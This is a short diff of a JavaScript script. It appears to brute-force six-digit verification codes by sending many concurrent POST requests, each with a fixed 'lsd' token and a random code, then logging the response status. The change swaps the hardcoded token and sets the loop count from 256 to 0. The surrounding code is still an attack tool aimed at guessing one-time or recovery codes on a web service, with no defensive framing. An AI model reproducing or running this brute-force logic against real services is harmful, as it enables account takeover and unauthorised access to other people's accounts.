@@ -25,10 +25,10 @@ const USER_AGENT = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, l
   // child_process.exec('siren warn');
 
   // const lsd = helpers.randomString(11);
-  const lsd = 'AVpc27UCYxc';
+  const lsd = 'AVpc27UCzBs';
   log(lsd);
   const p = [];
-  for (let i = 0, code; 256 > i; ++i) {
+  for (let i = 0, code; 0 > i; ++i) {
     code = rand(111111, 999999);
     p.push(new Promise(r => httpClient.post(url, headers, 'lsd='+lsd+'&n='+code).then(res => (log(res.statusCode), r()))));
   }
